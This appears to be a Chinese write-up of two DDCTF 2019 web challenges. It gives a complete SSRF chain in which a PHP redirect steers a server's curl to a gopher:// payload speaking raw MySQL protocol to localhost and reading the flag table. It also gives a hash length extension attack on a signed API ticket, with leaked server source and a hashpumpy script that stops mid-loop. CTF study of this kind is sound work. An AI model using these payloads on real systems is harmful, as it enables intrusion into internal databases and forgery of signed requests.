起因：
![img](https://raw.githubusercontent.com/wiki/imtinmin/photo/DDCTF2019/15.png)

然后骚扰出题人

`MYSQL弱口令`
>解法:gopher攻击mysql

原题大多数做法是读取`.mysql_history`获取flag，当这个文件被删除的，就可能需要另外一种做法--gopher攻击mysql，感觉才是预期解法

# 读取源码
我们利用之前的脚本读取`views.py`

```python
# coding=utf-8

from flask import jsonify, request
from struct import unpack
from socket import inet_aton
import MySQLdb
from subprocess import Popen, PIPE
import re
import os
import base64


# flag in mysql  curl@localhost database:security  table:flag

def weak_scan():

    agent_port = 8123
    result = []
    target_ip = request.args.get('target_ip')
    target_port = request.args.get('target_port')
    if not target_ip or not target_port:
        return jsonify({"code": 404, "msg": "参数不能为空", "data": []})
    if not target_port.isdigit():
        return jsonify({"code": 404, "msg": "端口必须为数字", "data": []})
    if not checkip(target_ip):
        return jsonify({"code": 404, "msg": "必须输入ip", "data": []})
    if is_inner_ipaddress(target_ip):
        return jsonify({"code": 404, "msg": "ip不能是内网ip", "data": []})
    tmp_agent_result = get_agent_result(target_ip, agent_port)
    if not tmp_agent_result[0] == 1:
    tem_result = tmp_agent_result[1]
        result.append(base64.b64encode(tem_result))
        return jsonify({"code": 404, "msg": "服务器未开启mysql", "data": result})

    tmp_result =mysql_scan(target_ip, target_port)

    if not tmp_result['Flag'] == 1:
        tem_result = tmp_agent_result[1]
        result.append(base64.b64encode(tem_result))
        return jsonify({"code": 0, "msg": "未扫描出弱口令", "data": []})
    else:
        tem_result = tmp_agent_result[1]
        result.append(base64.b64encode(tem_result))
        result.append(tmp_result)
        return jsonify({"code": 0, "msg": "服务器存在弱口令", "data": result})


def checkip(ip):
    p = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
    if p.match(ip):
        return True
    else:
        return False

def curl(url):
    tmp = Popen(['curl', url, '-L', '-o', 'content.log'], stdout=PIPE)
    tmp.wait()
    result = tmp.stdout.readlines()
    return result

def get_agent_result(ip, port):

    str_port = str(port)
    url = 'http://'+ip + ':' + str_port
    curl(url)
    if not os.path.exists('content.log'):
        return (0, '未开启agent')
    with open('content.log') as f1:
        tmp_list = f1.readlines()
        response = ''.join(tmp_list)
    os.remove('content.log')
    if not 'mysqld' in response:
        return (0, response)
    else:
        return (1, response)


def ip2long(ip_addr):

    return unpack("!L", inet_aton(ip_addr))[0]

def is_inner_ipaddress(ip):

    ip = ip2long(ip)
    return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
            ip2long('10.0.0.0') >> 24 == ip >> 24 or \
            ip2long('172.16.0.0') >> 20 == ip >> 20 or \
            ip2long('192.168.0.0') >> 16 == ip >> 16

def mysql_scan(ip, port):

    port = int(port)
    weak_user = ['root', 'admin', 'mysql']
    weak_pass = ['', 'mysql', 'root', 'admin', 'test']
    Flag = 0
    for user in weak_user:
        for pass_wd in weak_pass:
            if mysql_login(ip,port, user, pass_wd):
                Flag = 1
                tmp_dic = {'weak_user': user, 'weak_passwd': pass_wd, 'Flag': Flag}
                return tmp_dic
            else:
                tmp_dic = {'weak_user': '', 'weak_passwd': '', 'Flag': Flag}
                return tmp_dic



def mysql_login(host, port, username, password):
    '''mysql login check'''

    try:
        conn = MySQLdb.connect(
            host=host,
            user=username,
            passwd=password,
            port=port,
            connect_timeout=1,
            )
        print ("[H:%s P:%s U:%s P:%s]Mysql login Success" % (host,port,username,password),"Info")
        conn.close()
        return True
    except MySQLdb.Error, e:

        print ("[H:%s P:%s U:%s P:%s]Mysql Error %d:" % (host,port,username,password,e.args[0]),"Error")
        return False


```

注意这一段
```python
def curl(url):
    tmp = Popen(['curl', url, '-L', '-o', 'content.log'], stdout=PIPE)
    tmp.wait()
    result = tmp.stdout.readlines()
    return result
def get_agent_result(ip, port):

    str_port = str(port)
    url = 'http://'+ip + ':' + str_port
    curl(url)
    if not os.path.exists('content.log'):
        return (0, '未开启agent')
    with open('content.log') as f1:
        tmp_list = f1.readlines()
        response = ''.join(tmp_list)
    os.remove('content.log')
    if not 'mysqld' in response:
        return (0, response)
    else:
        return (1, response)
```
扫描时是python mysqldb的client通过mysql协议与服务器进行连接 并试探弱口令,`agent.py`是运行在服务器8123端口,会先`curl+url -L -o content.log`,返回值不用管，`curl`是支持`gopher`协议的，可以想到用`gopher`攻击mysql

有很多gopher攻击mysql的文章，讲的很清楚，我就不班门弄斧了
[https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/](https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/)
[https://www.baidu.com/link?url=AsD8iSbPxkkFW-esAcd4IwL10bUORvLUO_FA9PLK0Nt4KcMGBmc9OeIAZLkC4fRygM3PSbcM8cKAHg3u1V957q&wd=&eqid=a9cf5feb0002c91b000000065ccd8979](https://www.baidu.com/link?url=AsD8iSbPxkkFW-esAcd4IwL10bUORvLUO_FA9PLK0Nt4KcMGBmc9OeIAZLkC4fRygM3PSbcM8cKAHg3u1V957q&wd=&eqid=a9cf5feb0002c91b000000065ccd8979)
    
点击扫描会发现这道题还开放了api接口，内容是`curl`的结果的`base64`编码
![img](https://raw.githubusercontent.com/wiki/imtinmin/photo/gopher-mysql/1.png)

# 构造数据包

打开vps

根据题目的提示
```
# flag in mysql  curl@localhost database:security  table:flag
```

创建用户、数据库、表
```
CREATE USER 'curl'@'localhost' IDENTIFIED BY '';
CREATE DATABASE security;
GRANT all privileges ON security.* TO 'curl'@'localhost';
use security;
create table flag (id int,string VARCHAR(255));
```

`tcpdump`抓取mysql数据包

```
tcpdump -i l0 port 3306 -w mysql.pcap
mysql -ucurl -p
use security;
select * from flag;
exit;
```
# 构造出gopher
然后wireshark设置，TCP追踪一下MYSQL协议的流，过滤出发给3306的数据，转换为原始数据
![img](https://raw.githubusercontent.com/wiki/imtinmin/photo/gopher-mysql/2.png)

```
a300000185a6ff01000000012100000000000000000000000000000000000000000000006375726c00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f7069640532303834310f5f636c69656e745f76657273696f6e06352e372e3235095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c
210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031
120000000353454c4543542044415441424153452829
09000000027365637572697479
0f0000000373686f7720646174616261736573
0c0000000373686f77207461626c6573
0600000004666c616700
130000000373656c656374202a2066726f6d20666c6167
0100000001
```
用脚本转换一下
```python
#coding:utf-8

def results(s):
    a=[s[i:i+2] for i in xrange(0,len(s),2)]
    return "curl gopher://127.0.0.1:3306/_%"+"%".join(a)
if __name__=="__main__":
    import sys
    s=sys.argv[1]
    print(results(s))
```

![img](https://raw.githubusercontent.com/wiki/imtinmin/photo/gopher-mysql/3.png)

```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%75%72%6c%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%30%38%34%31%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%35%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%09%00%00%00%02%73%65%63%75%72%69%74%79%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01
```
# 构造重定向页面
在服务上8123端口启动一个web服务，
nginx配置
```
server {
    listen 8123 default_server;
    root /var/www/html/tinmin;
    index 1.php;
    location /tinmin/ {
        # First attempt to serve request as file, then
        # as directory, then fall back to displaying a 404.
        try_files $uri $uri/ =404;
    }
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
    #
    #   # With php-fpm (or other unix sockets):
        fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
    #   # With php-cgi (or other tcp sockets):
    #   fastcgi_pass 127.0.0.1:9000;
    }
}

```

`1.php`
```php
<?php
    header('Location:gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%75%72%6c%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%30%38%34%31%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%35%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%09%00%00%00%02%73%65%63%75%72%69%74%79%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01');
?>
```
访问
```
http://117.51.147.155:5000/ctf/api/weak_scan?target_ip=xxx.xxx.xxx.xxx&target_port=3306
```
得到
```
{"code":404,"data":["SgAAAAo1LjYuNDMAJwIAACotQkZ2RCxQAP/3CAIAf4AVAAAAAAAAAAAAAC0xTGtURkBNQ0h+YgBteXNxbF9uYXRpdmVfcGFzc3dvcmQABwAAAgAAAAIAAAABAAABAScAAAIDZGVmAAAAEUBAdmVyc2lvbl9jb21tZW50AAwhAFQAAAD9AAAfAAAFAAAD/gAAAgAdAAAEHE15U1FMIENvbW11bml0eSBTZXJ2ZXIgKEdQTCkFAAAF/gAAAgABAAABASAAAAIDZGVmAAAACkRBVEFCQVNFKCkADCEAZgAAAP0AAB8AAAUAAAP+AAACAAEAAAT7BQAABf4AAAIABwAAAQAAAAIAAAABAAABAUsAAAIDZGVmEmluZm9ybWF0aW9uX3NjaGVtYQhTQ0hFTUFUQQhTQ0hFTUFUQQhEYXRhYmFzZQtTQ0hFTUFfTkFNRQwhAMAAAAD9AQAAAAAFAAAD/gAAIgATAAAEEmluZm9ybWF0aW9uX3NjaGVtYQYAAAUFbXlzcWwTAAAGEnBlcmZvcm1hbmNlX3NjaGVtYQkAAAcIc2VjdXJpdHkFAAAI/gAAIgABAAABAVoAAAIDZGVmEmluZm9ybWF0aW9uX3NjaGVtYQtUQUJMRV9OQU1FUwtUQUJMRV9OQU1FUxJUYWJsZXNfaW5fc2VjdXJpdHkKVEFCTEVfTkFNRQwhAMAAAAD9AQAAAAAFAAAD/gAAIgAFAAAEBGZsYWcFAAAF/gAAIgAsAAABA2RlZghzZWN1cml0eQRmbGFnBGZsYWcCaWQCaWQMPwALAAAAAwEQAAAAATAvAAACA2RlZghzZWN1cml0eQRmbGFnBGZsYWcEZmxhZwRmbGFnDCEA/QIAAP4AAAAAAPsFAAAD/gAAAgABAAABAioAAAIDZGVmCHNlY3VyaXR5BGZsYWcEZmxhZwJpZAJpZAw/AAsAAAADARAAAAAuAAADA2RlZghzZWN1cml0eQRmbGFnBGZsYWcEZmxhZwRmbGFnDCEA/QIAAP4AAAAAAAUAAAT+AAAiACoAAAUBMSdERENURnswYjVkMDVkODBjY2ViNGI4NWM4MjQzYzAwYjYyYTdjZH0FAAAG/gAAIgA="],"msg":"\u670d\u52a1\u5668\u672a\u5f00\u542fmysql"}
```
解码
![img](https://raw.githubusercontent.com/wiki/imtinmin/photo/gopher-mysql/4.png)
```
DDCTF{0b5d05d80cceb4b85c8243c00b62a7cd}
```

`大吉大利，今晚吃鸡`

>解法:哈希扩展攻击

大吉大利今晚吃鸡这题一般做法是写脚本批量注册、买门票、获取`id`,`ticket`然后移除，但是这个做法具有不确定性，id会疯狂重复，可能会一直吃不了鸡

赛后通过`mysql弱口令扫描`读取文件，可以读到`home/dc2-user/ctf_web_1/web_1/app/main/views.py `

`views.py`

```python
#from: ('117.51.147.155', 52848)
# coding=utf-8

from flask import jsonify, request,redirect
from app import mongodb
from app.unitis.tools import get_md5, num64_to_32
from app.main.db_tools import get_balance, creat_env_db, search_bill, secrity_key, get_bill_id
import uuid
from urllib import unquote

mydb = mongodb.db

flag = '''DDCTF{chiken_dinner_hyMCX[n47Fx)}'''

def register():

    result = []
    user_name = request.args.get('name')
    password = request.args.get('password')

    if not user_name or not password:
        response = jsonify({"code": 404, "msg": "参数不能为空", "data": []})
        return response
    if not len(password)>=8:
        response = jsonify({"code": 404, "msg": "密码必须大于等于8位", "data": []})
        return response
    else:
        hash_val = get_md5(user_name, 'DDCTF_2019')

        if not mydb.get_collection('account').find_one({'user_name': user_name}):
            mydb.get_collection('account').insert_one({'user_name': user_name, 'password' :password, 'balance': 100,
                                                       'hash_val': hash_val, 'flag': 'test'})
            tmp_result = {'user_name': user_name, 'account': 100}
            result.append(tmp_result)
            response = jsonify({"code": 200, "msg": "用户注册成功", "data": result})
            response.set_cookie('user_name', user_name)
            response.set_cookie('REVEL_SESSION', hash_val)
            response.headers['Server'] = 'Caddy'
            return response
        else:
            response = jsonify({"code": 404, "msg": "用户已存在", "data": []})
            response.set_cookie('user_name', user_name)
            response.set_cookie('REVEL_SESSION', hash_val)
            response.headers['Server'] = 'Caddy'
            return response

def login():

    result = []
    user_name = request.args.get('name')
    password = request.args.get('password')

    if not user_name or not password:
        response = jsonify({"code": 404, "msg": "参数不能为空", "data": []})
        return response
    if not mydb.get_collection('account').find_one({'user_name': user_name}):
        response = jsonify({"code": 404, "msg": "该用户未注册", "data": result})
        return response
    if not password == mydb.get_collection('account').find_one({'user_name': user_name})['password']:
        response = jsonify({"code": 404, "msg": "密码错误", "data": result})
        return response
    else:
        hash_val = mydb.get_collection('account').find_one({'user_name': user_name})['hash_val']
        response = jsonify({"code": 200, "msg": "登陆成功", "data": result})
        response.set_cookie('user_name', user_name)
        response.set_cookie('REVEL_SESSION', hash_val)
        response.headers['Server'] = 'Caddy'
        return response

def get_user_balance():
    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    if not user_name or not hash_val:
        response = jsonify({"code": 404, "msg": "您未登陆", "data": []})
        response.headers['Server'] = 'Caddy'
        return response
    else:
        str_md5 = get_md5(user_name, 'DDCTF_2019')
        if hash_val == str_md5:
            balance = get_balance(user_name)
            bill_id  = get_bill_id(user_name)
            tmp_dic = {'balance': balance , 'bill_id': bill_id}
            result.append(tmp_dic)
            return jsonify({"code": 200, "msg": "查询成功", "data": result})
        else:
            return jsonify({"code": 404, "msg": "参数错误", "data": []})

def buy_ticket():

    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    ticket_price = int(request.args.get('ticket_price'))
    if not user_name or not hash_val or not ticket_price:
        response = jsonify({"code": 404, "msg": "参数错误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify({"code": 404, "msg": "登陆信息有误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    if ticket_price < 1000:
        response = jsonify({"code": 200, "msg": "ticket门票价格为2000", "data": []})
        response.headers['Server'] = 'Caddy'
        return response
    if search_bill(user_name):
        tmp_list = []
        bill_tmp = {'bill_id': search_bill(user_name)}
        tmp_list.append(bill_tmp)
        response = jsonify({"code": 200, "msg": "请支付未完成订单", "data": tmp_list})
        response.headers['Server'] = 'Caddy'
        return response
    else:
        # 生成uuid 保存订单
        hash_id = str(uuid.uuid4())
        tmp_dic = {'user_name': user_name, 'ticket_price': ticket_price, 'bill_id': hash_id}
        mydb.get_collection('bill').insert_one(tmp_dic)
        result.append({'user_name': user_name, 'ticket_price': ticket_price, 'bill_id': hash_id})
        response = jsonify({"code": 200, "msg": "购买门票成功", "data": result})
        response.headers['Server'] = 'Caddy'
        return response

def search_bill_info():
    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    if not user_name or not hash_val:
        response = jsonify({"code": 404, "msg": "您未登陆", "data": []})
        response.headers['Server'] = 'Caddy'
        return response
    else:
        str_md5 = get_md5(user_name, 'DDCTF_2019')
        if hash_val == str_md5:
            tmp = mydb.get_collection('bill').find_one({'user_name': user_name})
            if not tmp:
                return jsonify({"code": 200, "msg": "不存在订单", "data": result})
            bill_id = tmp['bill_id']
            user_name =user_name
            bill_price = tmp['ticket_price']
            tmp_dic = {'user_name': user_name, 'bill_id': bill_id, 'bill_price': bill_price}
            result.append(tmp_dic)
            return jsonify({"code": 200, "msg": "查询成功", "data": result})
        else:
            return jsonify({"code": 404, "msg": "参数错误", "data": []})


def recall_bill():

    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    bill_id = request.args.get('bill_id')
    if not user_name or not hash_val:
        response = jsonify({"code": 404, "msg": "参数不能为空", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify({"code": 404, "msg": "登陆信息有误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    tmp =mydb.get_collection('bill').find_one({'bill_id': bill_id})
    if not tmp:
        response = jsonify({"code": 404, "msg": "订单号不存在", "data": []})
        response.headers['Server'] = 'Caddy'
        return response
    if tmp['user_name'] != user_name:
        response = jsonify({"code": 404, "msg": "订单号不存在", "data": []})
        response.headers['Server'] = 'Caddy'
        return response
    else:
        mydb.get_collection('bill').delete_one({'bill_id': bill_id})
        tmp_result = {'user_name': tmp['user_name'], 'bill_id': tmp['bill_id'], 'ticket_price': tmp['ticket_price']}
        result.append(tmp_result)
        response = jsonify({"code": 200, "msg": "订单已取消", "data": result})
        response.headers['Server'] = 'Caddy'
        return response


def pay_ticket():

    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    bill_id = request.args.get('bill_id')
    if not user_name or not hash_val or not bill_id:
        response = jsonify({"code": 404, "msg": "参数不能为空", "data": []})
        response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
        response.headers['X-Powered-By'] = ' Servlet/3.0'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify({"code": 404, "msg": "登陆信息有误", "data": []})
        response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
        response.headers['X-Powered-By'] = ' Servlet/3.0'
        return response
    tmp_obj = mydb.get_collection('bill').find_one({'bill_id':bill_id})
    if not tmp_obj:
        response = jsonify({"code": 404, "msg": "订单信息有误", "data": []})
        response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
        response.headers['X-Powered-By'] = ' Servlet/3.0'
        return response
    tmp_price = mydb.get_collection('bill').find_one({'user_name': user_name})['ticket_price']
    tmp_bill_uuid = mydb.get_collection('bill').find_one({'bill_id': bill_id})['bill_id']
    price = num64_to_32(tmp_price)
    tmp_account = mydb.get_collection('account').find_one({'user_name': user_name})['balance']
    if tmp_bill_uuid == bill_id:
        if tmp_account >= price:
            if mydb.get_collection('user_env').find_one({'user_name': user_name}):
                tmp = mydb.get_collection('user_env').find_one({'user_name': user_name})['user_info_list']
                for item in tmp:
                    if item['user_name'] == user_name:
                        result.append(item)
                    else:
                        pass
                    response = jsonify({"code": 200, "msg": "已购买ticket", "data": result})
                    response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
                    response.headers['X-Powered-By'] = ' Servlet/3.0'
                return response
            else:
                account = tmp_account - price
                mydb.get_collection('account').update_one({'user_name': user_name}, {'$set': {'balance': account}},
                                                          upsert=True)
                mydb.get_collection('bill').delete_one({'bill_id': bill_id})
                tmp_info = creat_env_db(user_name)
                mydb.get_collection('user_env').insert_one(tmp_info[0])
                tmp_result = {'your_ticket': tmp_info[1]['hash_val'], 'your_id': tmp_info[1]['id']}
                result.append(tmp_result)
                response = jsonify({"code": 200, "msg": "交易成功", "data": result})
                response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
                response.headers['X-Powered-By'] = ' Servlet/3.0'
                return response
        else:
            response = jsonify({"code": 200, "msg": "余额不足", "data": []})
            response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
            response.headers['X-Powered-By'] = ' Servlet/3.0'
            return response
    else:
        response = jsonify({"code": 200, "msg": "订单信息有误", "data": []})
        response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
        response.headers['X-Powered-By'] = ' Servlet/3.0'
        return response

def is_login():
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    if not user_name or not hash_val:
        response = jsonify({"code": 404, "msg": "参数不能为空", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify({"code": 404, "msg": "登陆信息有误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response
    response = jsonify({"code": 200, "msg": "您已登陆", "data": []})
    return response


def search_ticket():
    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    if not user_name or not hash_val:
        response = jsonify({"code": 404, "msg": "参数不能为空", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify({"code": 404, "msg": "登陆信息有误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    tmp = mydb.get_collection('user_env').find_one({'user_name': user_name})

    if not tmp:
        response = jsonify({"code": 404, "msg": "你还未获取入场券", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    if tmp:
        tmp_dic = {'ticket': tmp['player_info']['hash_val'], 'id': tmp['player_info']['id']}
        result.append(tmp_dic)
        response = jsonify({"code": 200, "msg": "ticket信息", "data": result})
        response.headers['Server'] = 'Caddy'
        return response


def remove_robot():

    result = []
    sign_str = ''
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    a = request.environ['QUERY_STRING']
    params_list = []
    for item in a.split('&'):
        k, v = item.split('=')
        params_list.append((k, v))

    user_id = request.args.get('id')
    ticket = request.args.get('ticket')

    if not user_name or not hash_val or not user_id or not ticket:
        response = jsonify({"code": 404, "msg": "参数错误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    # if not str.isdigit(user_id):
    #     return jsonify({"code": 0, "msg": "参数错误", "data": []})

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify({"code": 404, "msg": "登陆信息有误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response
    find_result = mydb.get_collection('user_env').find_one({'user_name': user_name})
    if not find_result:
        response = jsonify({"code": 404, "msg": "未购买ticket", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    for item in params_list:
        if item[0] == 'ticket':
            params_list.remove(item)
    for item in params_list:
        sign_str = sign_str + unquote(item[0]) + unquote(item[1])
        print sign_str
    sign_str_md5 = get_md5(sign_str, secrity_key)
    print len(secrity_key)
    print sign_str
    print(sign_str_md5)
    print ticket
    if sign_str_md5 != ticket:
        response = jsonify({"code": 404, "msg": "参数错误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    if find_result['player_info']['id'] == int(user_id):
        response = jsonify({"code": 200, "msg": "参数检查正确，但你不能将你自己移除", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    tmp_list = find_result['user_info_list']
    for item in tmp_list:
        if item['id'] == int(user_id):
            rm_robot = {'robot_name': item['user_name'], 'id': item['id'], 'robot_ticket': item['hash_val']}
            result.append(rm_robot)
            tmp_list.remove(item)
    mydb.get_collection('user_env').update_one({'user_name': user_name}, {'$set': {'user_info_list': tmp_list}},
                                               upsert=True)
    response = jsonify({"code": 200, "msg": "移除一个机器人玩家", "data": result})
    response.headers['Server'] = 'Caddy'
    return response


def get_flag():

    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')

    if not user_name or not hash_val:
        response = jsonify({"code": 404, "msg": "参数错误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify({"code": 404, "msg": "登陆信息有误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    tmp_result = mydb.get_collection('user_env').find_one({'user_name':user_name})

    if not tmp_result:
        response = jsonify({"code": 404, "msg": "参数错误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    tmp_list = tmp_result['user_info_list']

    if len(tmp_list) != 1:
        result.append(len(tmp_list))
        response = jsonify({"code": 200, "msg": "还有剩余的机器人未淘汰", "data": result})
        response.headers['Server'] = 'Caddy'
        return response

    if tmp_list[0]['user_name'] == user_name:
        result.append(flag)
        response = jsonify({"code": 200, "msg": "大吉大利，今晚吃鸡", "data": result})
        response.headers['Server'] = 'Caddy'
        return response

```

看到移除机器人这一段代码
```
def remove_robot():

    result = []
    sign_str = ''
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    a = request.environ['QUERY_STRING']
    params_list = []
    for item in a.split('&'):
        k, v = item.split('=')
        params_list.append((k, v))

    user_id = request.args.get('id')
    ticket = request.args.get('ticket')

    if not user_name or not hash_val or not user_id or not ticket:
        response = jsonify({"code": 404, "msg": "参数错误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    # if not str.isdigit(user_id):
    #     return jsonify({"code": 0, "msg": "参数错误", "data": []})

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify({"code": 404, "msg": "登陆信息有误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response
    find_result = mydb.get_collection('user_env').find_one({'user_name': user_name})
    if not find_result:
        response = jsonify({"code": 404, "msg": "未购买ticket", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    for item in params_list:
        if item[0] == 'ticket':
            params_list.remove(item)
    for item in params_list:
        sign_str = sign_str + unquote(item[0]) + unquote(item[1])
        print sign_str
    sign_str_md5 = get_md5(sign_str, secrity_key)
    print len(secrity_key)
    print sign_str
    print(sign_str_md5)
    print ticket
    if sign_str_md5 != ticket:
        response = jsonify({"code": 404, "msg": "参数错误", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    if find_result['player_info']['id'] == int(user_id):
        response = jsonify({"code": 200, "msg": "参数检查正确，但你不能将你自己移除", "data": []})
        response.headers['Server'] = 'Caddy'
        return response

    tmp_list = find_result['user_info_list']
    for item in tmp_list:
        if item['id'] == int(user_id):
            rm_robot = {'robot_name': item['user_name'], 'id': item['id'], 'robot_ticket': item['hash_val']}
            result.append(rm_robot)
            tmp_list.remove(item)
    mydb.get_collection('user_env').update_one({'user_name': user_name}, {'$set': {'user_info_list': tmp_list}},
                                               upsert=True)
    response = jsonify({"code": 200, "msg": "移除一个机器人玩家", "data": result})
    response.headers['Server'] = 'Caddy'
    return response
```

`ticket`的值是`get_md5(sign_str+secrity_key)`,而`sign_str`为`request.environ['QUERY_STRING']`除去ticket之后的键值相加
比如：
```
http://117.51.147.155:5050/ctf/api/remove_robot?xxxx=&id=62&ticket=35c26fc4f394c54e934379cb8d80ed85
```
那么获取的`sign_str`就为`xxxxid62`,可以通过增加get请求的变量改变`sign_str`来达到哈希扩展攻击的目的

未知secrity_key长度，通过刚开始买票的id,ticket验证爆破长度
参考[web.jarvisoj.com:32778/index.php](web.jarvisoj.com:32778/index.php)的WP
我看的是这个[https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/](https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/)


```python
import hashpumpy
import requests
import json
from urllib import quote_plus
import time

s = requests.session()
r = s.get("http://117.51.147.155:5050/ctf/api/login?name=imtinmin1&password=12345678")
print r.text
def get_hash(hash,org,add,len):
    result = []
    tmp = hashpumpy.hashpump(hash,org,add,len)
    hash = tmp[0]
    hex_str = tmp[1]
    url_str = quote_plus(hex_str)
    result.append(hash)
    result.append(hex_str)
    result.append(url_str)

    return result
    

if __name__ == '__main__':
    for i in range(100):
        print i
        m = get_hash('35c26fc4f394c54e934379cb8d80ed85','id62','id62',i)
        tic = m[0]
        msg = m[2].rstrip('id62')
        print tic
        print msg
